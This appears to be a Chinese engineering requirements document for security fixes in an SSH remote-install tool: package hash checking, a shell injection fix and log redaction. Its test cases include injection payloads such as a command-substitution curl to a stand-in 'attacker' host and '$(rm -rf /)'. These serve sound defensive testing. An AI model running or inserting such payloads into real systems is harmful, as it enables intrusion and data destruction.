# 远程 SSH 安全收尾 — Hash 校验 + 注入修复 + 脱敏补全 (requirement)

> 关联文档:
> - [`docs/general/remote_ssh_plan.md`](../general/remote_ssh_plan.md) §6 安全基线
> - [`docs/requirements/2026-05-06-remote-ssh-p4.md`](./2026-05-06-remote-ssh-p4.md) F5 体验细节(含安全)
> - 历史脱敏诊断包: [`src/core/logging/crash_bundle.py`](../../src/core/logging/crash_bundle.py)
>
> 运行模式: `vibe interactive_governed`
> 终止阶段: `phase_cleanup`
> 冻结日期: 2026-05-07
> 内部执行档位: **L** (3 个收尾子项, 串行原生执行, 无 wave 间并行)

## 1. 背景

P1~P4 全部验收完成后, 一轮安全设计审查识别出 3 个明确问题:

1. **NapCat 安装/更新包未做完整性校验** — Desktop 既不校验本地下载的
   `NapCat.Shell.zip` 也不校验远端 curl 下来的同名文件; 一旦 GitHub Release CDN 被
   投毒 / 镜像源被劫持, Desktop 会无声把任意可执行内容注入到 LinuxQQ 的
   `app_launcher` 目录. 上游 NapNeko 已经维护
   [`napcat-release-hash`](https://github.com/NapNeko/napcat-release-hash) 仓库,
   按版本提供 `shell.sha512` / `framework.sha512`, Desktop 只需消费即可闭合该缺口.

2. **`workspace_dir` 用户输入存在 shell 命令注入** — 详见上一轮审查 "缺口 3":
   `LineEditConfigCard("远端工作目录")` 直接落到
   [`LinuxCorePaths.workspace_dir`](../../src/core/remote/models.py),
   后续通过 [`inject_script_variables`](../../src/core/remote/templates.py) 注入到
   bash 双引号字符串, 仅转义 `"` 不转义 `$()` / 反引号, 攻击者可构造
   `$HOME/Napcat$(curl http://attacker/$(whoami))` 触发命令替换.

3. **QQID 路径形式不在脱敏白名单内** — 现有
   [`sanitize_text_for_export`](../../src/core/logging/crash_bundle.py) 仅匹配
   `QQID=12345` / `qq_id: 12345` 形式. 但远程链路实际打到 `app.log` 的形态包括
   `napcat_3217681217.log` / `qq --no-sandbox -q 3217681217` /
   `ManagerNapCatQQProcess[3217681217]`, 这些都会原样出现在脱敏诊断包里,
   等价于"导出包仍带 QQ 号", 与脱敏承诺不一致.

此外, 用户特别强调 **网络鲁棒性**: 部分用户的服务器(尤其大陆 IDC) 访问 GitHub
极不稳定, hash 校验流程不能因为拉不到 `release.json` 就硬阻断安装.

## 2. In-Scope (本次必须交付)

| 子项     | 标签                                        | 简述                                                                                                                                                                                   |
| -------- | ------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **F1**   | NapCat Shell 包 SHA512 上游校验             | 新增 `ReleaseHashService`: 统一拉取/缓存/查询 `napcat-release-hash` 的 `release.json`; 本地与远端两条安装路径都接入校验; 网络异常按 §3.F1 降级矩阵处理.                                |
| **F2**   | `workspace_dir` 命令注入修复                | `inject_script_variables` 改 POSIX 单引号转义; `_quote_remote_argument` 移除 `$HOME` 豁免改为前缀拼接; `LinuxCorePaths.__post_init__` 严格白名单校验; UI 同源校验阻止保存非法值.       |
| **F3**   | QQID 路径形式脱敏补全                       | `sanitize_text_for_export` 新增 `napcat_<qqid>.log/json/pid` 与 `-q <qqid>` / `[qqid]` / 进程命令行形式的窄正则, 仅替换数字段, 不影响其他文件名/字段.                                  |
| **F3.2** | SSH host / username / tunnel label 导出脱敏 | TRCE 实时落盘保留原始字符串, 仅在导出诊断包时脱敏: `host=`/`hostname=` 保留首字符 + 顶级域 (域名) 或末段 (IP); `username=` 仅保留首字符; `label=<host>->...` 把箭头左边的 host 段脱敏. |

## 3. Out-of-Scope (本期明确不做)

- **远端 LinuxQQ deb 包 SHA512 校验 (`framework`)** — 上游 hash 已提供,
  但 Desktop 当前不主导 LinuxQQ 下载(走 NapCat-Installer 标准脚本),
  本次仅校验 `shell` 字段. `framework` 留待与远端安装脚本统一时一起做.
- **远端响应 `cat` 大小上限 / 端口范围校验** (上次审查 缺口 4) — 不在本次范围.
- **`auto_add` 政策 UI 二次确认** (上次审查 缺口 5) — 不在本次范围.
- **`_password_cache` 进程退出钩子清理** (上次审查 加固 6) — 不在本次范围.
- **远程会话脱敏诊断包入口** (上次审查 缺口 2) — 不在本次范围.
- **release.json 仓库不存在/未公开时的兜底** — 仅记入 `release_hash_service`
  的"无可用 hash"分支(走用户二次确认), 不做仓库托管方案设计.
- **多镜像 / CDN 选择算法** — 仅给两个候选源 (raw.githubusercontent + jsdelivr),
  按顺序尝试; 不引入复杂的延迟探测.

## 4. 验收标准 (acceptance criteria)

每子项独立可验收, 任一失败本次不通过.

### F1. NapCat Shell 包 SHA512 上游校验

#### F1.1 `ReleaseHashService` 模块

- 新增 `src/core/versioning/release_hash_service.py`:
  ```python
  @dataclass(slots=True, frozen=True)
  class ReleaseHashEntry:
      version: str        # 不含 "v" 前缀, 与 napcat.mjs / Desktop 内部版本号对齐
      shell_sha512: str   # 64 字节十六进制小写, 长度 128
      framework_sha512: str
      updated_at: str     # ISO 时间戳, 仅展示用

  class ReleaseHashService:
      DEFAULT_SOURCES: tuple[str, ...] = (
          "https://raw.githubusercontent.com/NapNeko/napcat-release-hash/main/release.json",
          "https://cdn.jsdelivr.net/gh/NapNeko/napcat-release-hash@main/release.json",
      )
      CACHE_TTL_SECONDS: int = 7 * 24 * 3600

      def fetch(self, *, force: bool = False) -> ReleaseHashFetchResult: ...
      def lookup(self, version: str) -> ReleaseHashEntry | None: ...
      def cache_path(self) -> Path: ...
      def is_cache_fresh(self) -> bool: ...
  ```
- 缓存: `{data_path}/runtime/cache/napcat-release-hash.json`, 写入时附 `fetched_at`.
- 拉取: 顺序尝试 `DEFAULT_SOURCES`, 单源连接 5s + 读取 15s; 全部失败时返回 `cached`.
- 解析: 上游格式见 §A; 输入合法但缺字段的条目跳过; 字符串必须能被 `bytes.fromhex` 解析.

#### F1.2 网络降级矩阵 (核心要求)

| 场景                                             | 行为                                                                                  | 用户感知 |
| ------------------------------------------------ | ------------------------------------------------------------------------------------- | -------- |
| 网络正常, 拉到新数据                             | 写缓存, 校验放行                                                                      | 静默     |
| 网络失败, 缓存命中 (新鲜 / 过期都用)             | 用缓存校验, `info_bar` 提示"使用本地缓存的校验数据 (拉取于 X 天前)"                   | 一次提示 |
| 网络失败, 无缓存 + hash 必要 (本地/远端首次安装) | 弹 `MessageBox` 二次确认: "无法获取上游校验数据, 是否在不校验完整性的前提下继续安装?" | 阻断式   |
| Hash 计算后不匹配                                | **硬拒绝**, 删除已下载/已上传文件, `error_bar` 红色提示 + 写 `logger.error`           | 阻断     |
| 上游有该版本但 `shell.sha512` 字段缺失           | 视为"无 hash", 同上"无缓存"分支                                                       | 阻断式   |
| 上游 `release.json` 中**没有该版本**             | 视为"无 hash", 同上"无缓存"分支                                                       | 阻断式   |

#### F1.3 本地安装路径接入

- `src/core/installation/installers.py` (`NapCatInstall`) 在解压前插入校验步骤:
  - 读取 `version` 入参 (来自 `VersioningService.get_napcat_remote_version`)
  - `ReleaseHashService.lookup(version)` 取期望 SHA512
  - 用 `hashlib.sha512` 流式读 zip 文件 (4MB chunk) 计算
  - 不一致 → 删除 zip, 抛 `NapCatHashMismatchError`, UI 入口 (`install_page.py` /
    `napcat_page.py`) 把错误转为 `error_bar`
- 入口适配: `GuideWindow.install_page.NapCatInstallPage` /
  `ComponentPage.NapCatPage` 在 `download_finish_signal` 回调里, 先调
  `install_with_verification(version)`.

#### F1.4 远端安装路径接入

- 不通过 SFTP 上传 zip (避免带宽翻倍); 改为把期望 SHA512 通过环境变量
  `NAPCAT_EXPECTED_SHA512=<128hex>` 传给 `remote_install_napcat.sh`.
- `remote_install_napcat.sh` 在 `download_file` 之后插入:
  ```sh
  if [ -n "${NAPCAT_EXPECTED_SHA512:-}" ]; then
    log_progress 55 "verifying napcat shell sha512"
    if ! command -v sha512sum >/dev/null 2>&1; then
      log_error "sha512sum not available, cannot verify integrity"
      rm -f "$napcat_archive_path"
      exit 36
    fi
    actual=$(sha512sum "$napcat_archive_path" | awk '{print $1}')
    if [ "$actual" != "$NAPCAT_EXPECTED_SHA512" ]; then
      log_error "sha512 mismatch: expected=${NAPCAT_EXPECTED_SHA512} actual=${actual}"
      rm -f "$napcat_archive_path"
      exit 36
    fi
    log_info "sha512 verified ok"
  else
    log_warn "NAPCAT_EXPECTED_SHA512 not provided, integrity check skipped"
  fi
  ```
- `LinuxCoreDeployment.install_napcat` 在调用脚本前先 `ReleaseHashService.lookup`,
  按 §F1.2 降级矩阵决定是否带上 `NAPCAT_EXPECTED_SHA512`.
- 退出码 `36` 加入 `LinuxCoreDeployment` 的错误识别, 转换为
  `RemoteDeploymentError(stage="install_napcat_verify")` 并落到
  `friendly_errors` 友好文案.

#### F1.5 测试

- `script/test/test_release_hash_service.py`:
  - 缓存命中/未命中
  - 多源 fallback (第一个超时, 第二个成功)
  - 损坏 JSON 不阻断 (返回空)
  - `lookup("v4.18.1")` 与 `lookup("4.18.1")` 等价
- `script/test/test_napcat_install_hash_verify.py`:
  - hash 一致 → 安装继续
  - hash 不一致 → 抛 `NapCatHashMismatchError` + 文件被删
  - 无 hash 数据 → 不抛, 仅记 warning (具体二次确认在 UI 层不在此处)
- `script/test/test_remote_install_napcat_hash_env.py`:
  - 期望 hash 通过 env 传入, 命令字符串包含 `NAPCAT_EXPECTED_SHA512=...`
  - 退出码 36 → `RemoteDeploymentError(stage="install_napcat_verify")`
- `script/test/test_remote_install_napcat_sh_verify.py` (脚本级):
  - 在临时目录构造一个假 `napcat_archive` + 已知 sha512, 用 `bash -c` 跑脚本片段
  - 一致路径返回 0; 不一致路径返回 36 + archive 被删

### F2. `workspace_dir` 命令注入修复

#### F2.1 `inject_script_variables` 重写

- 新算法: POSIX 单引号转义 (单引号内一切字面量, 转义办法是把 `'` 替换为 `'\''`):
  ```python
  def _shell_single_quote(value: str) -> str:
      return "'" + value.replace("'", "'\\''") + "'"

  injected_lines = [f"{key}={_shell_single_quote(str(value))}" for key, value in variables.items()]
  ```
- 验收测试 (`script/test/test_templates_inject.py`):
  - `value="$HOME/Napcat"` 注入后等于 `key='$HOME/Napcat'`, bash 取出后**字面量**保留 `$HOME` (不被展开).
  - `value="$HOME/Napcat$(rm -rf /)"` 注入后 bash 取出仍是字面量, 不触发命令替换.
  - `value="it's mine"` (含单引号) 注入后语法合法, bash 取出值仍然是 `it's mine`.

> **副作用提醒**: 历史脚本里所有依赖 `$workspace_dir` 自动展开 `$HOME` 的写法都会失效.
> 因此 [`LinuxCorePaths`](../../src/core/remote/models.py) 在传给脚本前必须先把
> `$HOME` 展开为远端实际 home 目录(通过 SSH 探测得到), 由
> `LinuxCoreDeployment._build_script_variables` 统一负责. 脚本侧保留 `${var:-default}`
> 形态的兜底, 单元测试覆盖 home 探测失败时使用 `$HOME` 字面量(脚本端再次展开)的场景.

#### F2.2 `_quote_remote_argument` 修复

- 移除 `$HOME` 前缀豁免, 统一逻辑:
  ```python
  @staticmethod
  def _quote_remote_argument(value: str) -> str:
      if value.startswith("$HOME"):
          suffix = value[len("$HOME"):]
          # $HOME 不加引号, 让远端 shell 展开; suffix 走严格转义
          return '"$HOME"' + shlex.quote(suffix) if suffix else '"$HOME"'
      return shlex.quote(value)
  ```
- 验收: `value="$HOME/Napcat$(whoami)"` 转义后命令在远端执行时仅展开 `$HOME`,
  `$(whoami)` 保持字面量.

#### F2.3 `LinuxCorePaths.__post_init__` 校验

- 路径字段白名单: `^(\$HOME)?[A-Za-z0-9_./\\-]*$` (允许可选 `$HOME` 前缀 +
  字母数字 / `_` / `/` / `.` / `-`).
- 不合法时 `raise ValueError("LinuxCorePaths.<field> 含非法字符: ...")`.
- 在 `LinuxCorePaths` 改用 `dataclass(slots=True)` (现已是), 加 `__post_init__`.

#### F2.4 UI 同源校验

- `src/ui/page/setup_page/sub_page/remote.py` 与 `general.py` 的
  `LineEditConfigCard("远端工作目录")` 在保存按钮回调里, 提交前用同一正则校验,
  不通过则 `error_bar` 阻止保存.

#### F2.5 测试

- `script/test/test_linux_core_paths_validation.py`:
  - 合法路径: `$HOME/Napcat`, `/opt/napcat`, `$HOME/foo-bar_v1.2`
  - 非法路径: `$HOME/$(whoami)`, `/opt;rm`, `$HOME"x`
- `script/test/test_quote_remote_argument.py`: §F2.2 用例.
- `script/test/test_remote_setup_page_validation.py` (UI): 输入非法 workspace_dir
  时 `save` 不触发 `cfg.set`, 弹 error_bar.

### F3. QQID 路径形式脱敏补全

#### F3.1 `crash_bundle.sanitize_text_for_export` 扩展

- 新增窄正则, 仅替换被 `(<digits>)` 捕获的数字段, 保留前后字面量:
  ```python
  _QQID_FILENAME_PATTERN = re.compile(
      r"(napcat_)(\d{5,12})(\.(?:log|json|pid)(?:\.prev)?)"
  )
  _QQID_CMDLINE_PATTERN = re.compile(
      r"(\b-q\s+)(\d{5,12})\b"
  )
  _QQID_BRACKET_PATTERN = re.compile(
      r"(ManagerNapCatQQProcess\[)(\d{5,12})(\])"
  )
  ```
- 替换函数复用 `mask_qqid` 输出 `***1217` 风格.

#### F3.2 测试

- `script/test/test_crash_bundle_qqid_path_redaction.py`:
  - 输入 `"启动 napcat_3217681217.log 失败"` → 输出包含 `napcat_***1217.log`,
    且原始 11 位 QQ 号不出现.
  - `"qq --no-sandbox -q 3217681217"` → `"qq --no-sandbox -q ***1217"`
  - `"ManagerNapCatQQProcess[3217681217] 退出"` → `"ManagerNapCatQQProcess[***1217] 退出"`
  - 不影响 4 位以下数字 (例如端口 `:8080`)
  - 不影响普通文件名 `app.log` / `config.json`

### F3.2. SSH host / username / tunnel label 导出脱敏

#### 触发场景

TRCE 级别日志会原样写主机名 / 用户名到 `app.log`, 例如:

```
[TRCE] 执行远程命令: host=ac.rainplay.cn, timeout=15.0, ...
[INFO] SSH 连接已建立: host=ac.rainplay.cn, username=root
[INFO] SSH 隧道已建立: label=ac.rainplay.cn->127.0.0.1:6099
```

提交诊断包到上游 issue 时, 这些字段会暴露用户的服务器地址 + SSH 入口用户名,
方便定向 SSH 暴力破解 / 端口扫描.

#### F3.2.1 `mask_host` / `mask_username` 函数

新增 `src/core/logging/crash_bundle.py`:

- `mask_host(value)`:
  - 含 `.` (域名 / IPv4): 保留首字符 + 最后一段
    - `ac.rainplay.cn` → `a***.cn`
    - `server.example.com` → `s***.com`
    - `10.0.0.5` → `1***.5`
  - 不含 `.` (短主机名): 仅保留首字符 — `myserver` → `m***`
  - 空值: `<empty-host>`
- `mask_username(value)`:
  - 仅保留首字符: `root` → `r***`, `alice_dev` → `a***`
  - 空值: `<empty-user>`

设计取舍: 输出仍可让用户自己识别"哪台服务器", 但第三方拿到诊断包无法定向扫描.

#### F3.2.2 `sanitize_text_for_export` 接入三条窄正则

```python
_HOST_KEY_PATTERN = re.compile(
    r"(?i)([\"']?(?:host|hostname)[\"']?\s*[:=]\s*)([\"']?)([A-Za-z0-9._\-]+)([\"']?)"
)
_USERNAME_KEY_PATTERN = re.compile(
    r"(?i)([\"']?username[\"']?\s*[:=]\s*)([\"']?)([A-Za-z0-9._\-]+)([\"']?)"
)
_TUNNEL_LABEL_PATTERN = re.compile(
    r"(?i)(\blabel\s*=\s*)([A-Za-z0-9._\-]+)(->)"
)
```

替换语义: 仅触碰捕获组里的 host/username 段, 前后字面量原样保留.

应用顺序: tunnel_label → host → username → email → URL (URL 兜底, 完整 URL
仍走 `_URL_PATTERN` 整体替换).

#### F3.2.3 边界 / 不误伤

- `hosting=true` (含 host 子串但不是 host=): 不应处理
- `config_path=/etc/napcat.conf` (无关键值对): 不应处理
- 完整 URL `https://ac.rainplay.cn/api`: 仍走 `_URL_PATTERN`,
  整段被替换为 `<redacted-url>`, 不会与 host 规则冲突

#### F3.2.4 测试

- `script/test/test_crash_bundle_host_redaction.py`:
  - `mask_host` / `mask_username` 单元测试 (域名 / IP / 短名 / 空值)
  - `host=ac.rainplay.cn` → `host=a***.cn`
  - `username=root` → `username=r***`
  - `label=ac.rainplay.cn->127.0.0.1:6099` → `label=a***.cn->127.0.0.1:6099`
  - 综合场景 (host + username 同时出现 / host + qqid 同时出现)
  - 不误伤 `hosting=true` 与不相关的 KV
  - 不破坏既有 secret / qqid / URL 规则

## 5. 性能 / 兼容性约束

- **网络**: F1 启动期 fetch 必须**异步**, 主线程不阻塞超过 50ms (用 QThreadPool worker).
- **磁盘**: `release.json` 当前 ~10KB / 100 个版本; 缓存文件不超过 1MB 安全上限.
- **远端**: F1 远端校验依赖 `sha512sum` (Debian/Ubuntu/CentOS 默认安装于 `coreutils`);
  缺失时退出码 36 + 友好文案"远端缺少 sha512sum 工具, 无法验证完整性",
  且**不**降级到"跳过校验" (远端环境异常时偏严, 与本地降级语义对齐).
- **向后兼容**: F2 修改部署脚本注入语法, 必须确保已安装服务器再次部署时
  脚本运行正常 (脚本是上传覆盖式的, 无版本兼容问题).
- **配置兼容**: `LinuxCorePaths.__post_init__` 严格化后, 历史 `servers.json`
  里若存在非法路径会抛 ValueError. 在 `ServerProfile.from_dict` 里捕获该异常,
  退化到默认 `LinuxCorePaths()` 并 `logger.warning`, 服务器档案仍可加载.

## 6. 完成语言策略 (delivery truth contract)

- **完成 (full completion)**: 当 §4 全部 acceptance 通过 + §7 验证命令全绿时,
  允许使用 "完成 / 全部交付 / 验收通过" 等措辞.
- **部分完成 (partial)**: 任一子项有未通过的测试 / 未关闭的 TODO,
  必须使用 "部分完成 / 已交付 X、剩余 Y" 等措辞, 并在交付报告里列出残留项.
- **失败 (failure)**: 任一 acceptance 直接 NotImplemented / 测试 fail 且未修复时,
  使用 "未完成 / 阻塞" 措辞, 不得宣称"完成".

## 7. 验证命令

```powershell
# 单元测试 - 三项独立验证
uv run pytest script/test/test_release_hash_service.py -v
uv run pytest script/test/test_napcat_install_hash_verify.py -v
uv run pytest script/test/test_remote_install_napcat_hash_env.py -v
uv run pytest script/test/test_remote_install_napcat_sh_verify.py -v
uv run pytest script/test/test_templates_inject.py -v
uv run pytest script/test/test_quote_remote_argument.py -v
uv run pytest script/test/test_linux_core_paths_validation.py -v
uv run pytest script/test/test_crash_bundle_qqid_path_redaction.py -v
uv run pytest script/test/test_crash_bundle_host_redaction.py -v

# 全套回归 (至少与 P4 验收时同等绿)
uv run pytest script/test/ -x

# 静态检查
uv run ruff check src/core/versioning/release_hash_service.py src/core/installation/installers.py src/core/remote/templates.py src/core/remote/ssh_client.py src/core/remote/models.py src/core/logging/crash_bundle.py
```

## 8. 手工抽测 (manual spot checks)

> 仓库公开后(或上游确认 URL)再补充, 当前可在测试环境用本地 `release.json` 模拟.

1. **本地安装** — 启动 Desktop, 触发 NapCat 安装, 主动断网后再恢复网络观察缓存逻辑.
2. **远端安装 hash 一致** — 选一个上游 release.json 中的版本, 从远端服务器跑完
   `install_napcat`, 看到 "sha512 verified ok" 日志.
3. **远端安装 hash 不一致** — 在测试环境手动篡改 `napcat_archive_path`,
   观察脚本 exit 36 + Desktop 友好提示.
4. **`workspace_dir` 注入** — 在 UI 输入 `$HOME/Napcat$(touch /tmp/PWNED)`,
   保存被阻止; 即使绕过 UI 直接改 `config.json`, 远端部署也不应执行 `touch`.
5. **诊断包** — 触发崩溃, 解压脱敏诊断包, 搜索任意已运行过的 11 位 QQ 号
   字符串, 应**找不到任何一处**.

## 9. 非目标 / 推迟

- 本次不修改 `framework` (LinuxQQ deb) 校验链路.
- 本次不引入"hash 数据签名" (上游 release.json 仍可被 GitHub 仓库管理员替换);
  这属于"信任根"问题, 留待与 NapNeko 协商引入 minisign / GPG 时再做.
- 本次不优化镜像选择算法 (固定两源顺序).

## 10. 自治模式 (autonomy mode)

`interactive_governed`: 计划批准后允许连续执行至 phase_cleanup; 仅在以下三种情况
中断询问用户:
- 上游 `release.json` URL 与本文档假设不符 (404 持续, 用户需提供新 URL)
- 远端测试环境无 `sha512sum` (需要确认是否退化到 `openssl dgst` 兜底)
- ruff / pytest 出现非预期回归且根因不明

## 附录 A. 上游 release.json 实测 schema (2026-05-07)

```json
[
  {
    "version": "v4.18.1",
    "shell": {
      "sha512": "51d3d40c5141440cd623d64d8034514d7a0d2ce8a3ccc49407327dde53af35c0d1751be384e7ff0f8e35979fe2479332bd828f72bd566730bb004a5073ee2bf6"
    },
    "framework": {
      "sha512": "c6607afac8ba23e58bcec869c73772549c150cc701d751cdc2a7fee234ca24a511337d02d6587e1a086cc5217073f32cd6cc95e9d16d16d15f933d54bdcd4df0"
    },
    "updatedAt": "2026-04-26T10:15:05.272Z"
  }
]
```

- `version` 带 `v` 前缀, 内部比对时去掉
- `shell.sha512` 对应 `NapCat.Shell.zip` (本次校验目标)
- `framework.sha512` 对应 LinuxQQ 框架包 (本次不消费)
- `updatedAt` 仅展示用
